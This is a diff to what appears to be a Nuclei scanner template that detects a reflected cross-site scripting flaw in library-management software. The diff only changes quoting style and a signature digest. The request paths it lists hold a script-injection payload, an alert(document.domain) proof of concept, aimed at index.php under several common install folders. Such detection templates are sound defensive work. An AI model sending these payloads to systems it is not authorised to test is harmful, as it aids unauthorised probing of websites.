@@ -19,15 +19,15 @@ info:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/perpustakaan/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/perpustakaan/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/e-library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/perpus/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/digilib/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/bulian/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
-      - "{{BaseURL}}/library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php"
+      - '{{BaseURL}}/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/perpustakaan/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/perpustakaan/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/e-library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/perpus/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/digilib/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/bulian/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      - '{{BaseURL}}/library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
 
     stop-at-first-match: true
     matchers-condition: and
@@ -42,9 +42,9 @@ http:
       - type: word
         part: content_type
         words:
-          - "text/html"
+          - 'text/html'
 
       - type: status
         status:
           - 200
-# digest: 480a00453043022013133a36409d7d16af010f40a1d448f1f6d8c17af5704b0fb1cf24298d9f2b45021f1ec87cb5123414f9bb2d1fc5f094e3cf94a84f2b53657b389efe60369d380d:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022058f13b6d5a6f7ad3cce9ec4773fc8df07bf5a17da70de48dd3f58193d1472592022100a3619e460d5ef75f026e88f8f8bd6b2528655f0dc3a65e618150ba7c610f5482:922c64590222798bb761d5b6d8e72950
